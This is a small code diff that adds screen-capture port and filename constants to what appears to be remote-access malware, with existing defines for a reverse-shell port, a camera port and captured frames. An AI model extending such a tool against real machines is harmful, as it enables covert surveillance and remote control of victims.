@@ -19,9 +19,11 @@
 #define SERVER_IP "127.0.0.1"
 #define REVSHELL_PORT 4444
 #define CAMERA_PORT 3333
+#define SCREEN_PORT 2222
 
 #define BUFFER_SIZE 1024
 #define FRAME "frame.png"
+#define SCREEN "screen.png"
 
 #define LENGTH 4
 
